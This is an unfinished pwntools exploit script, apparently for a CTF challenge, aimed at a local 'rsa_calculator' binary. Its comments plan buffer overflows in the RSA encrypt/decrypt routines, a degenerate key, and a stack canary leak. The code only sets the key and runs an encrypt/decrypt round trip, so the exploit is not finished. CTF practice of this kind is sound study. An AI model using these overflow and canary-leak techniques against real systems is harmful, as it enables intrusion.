from pwn import *

context.log_level = "debug"

"""
Exploit plan
<Bug list>
    select menu input> -1, 0
    RSA_encrypt-sprintf> BOF but CANARY
    RSA_decrypt-memcpy> BOF but CANARY
    
    >>> use decrypt to use BOF because,
        encrypt put data "A" to "41000000"
<Set key>
-condition-
0 AND !(1 AND 2 AND 3)

0. p * q >= 256
1. e < (p-1)(q-1)
2. d < (p-1)(q-1)
3. e*d % {(p-1)(q-1)} != 1

p = 16, q = 16, e = 1, d = 1 >>>  this makes 'Plain = Encrypted = Decrypted'

encrypt
src > "A" * 1024 ( A - 1 Byte )
g_pbuf > "A" * 1024 ( A - 1 Byte )
g_ebuf > encrypted src, 512 ( A - 4Byte )
s > 1024 * 8 ( A - 8Byte )


<Procedure>
1. leak stack canary at RSA_decrypt by stuffing.
    rbp-0x1410 > s
    rbp-0x8 > canary
    "A" * 641
2. 
"""


def rsa_encrypt(txt):
    p.recvuntil(b"> ")
    p.sendline(b"2")
    p.recvuntil(b": ")
    p.sendline(b"1024")
    p.recvline()
    p.sendline(txt)
    p.recvline()
    return p.recvuntil(b"-")[:-3]


def rsa_decrypt(txt):
    p.recvuntil(b"> ")
    p.sendline(b"3")
    p.recvuntil(b": ")
    p.sendline(b"1024")
    p.recvline()
    p.sendline(txt)
    p.recvline()
    return p.recvuntil(b"-")[:-3]



p = process("/root/Downloads/rsa_calculator")

# 1. set key pair, p=16, q=16, e=1, d=1
key_pair = [b"16", b"16", b"1", b"1"]
p.recvuntil(b"> ")
p.sendline(b"1")
for i in range(4):
    p.recvuntil(b": ")
    p.sendline(key_pair[i])

# 2. rsa_encrypt
plain = b"A" * (0x8)
enc = rsa_encrypt(plain)

# 3. rsa_decrypt
dec = rsa_decrypt(enc)

print("plain: ", plain)
print("enc: ", enc)
print("dec: ", dec)
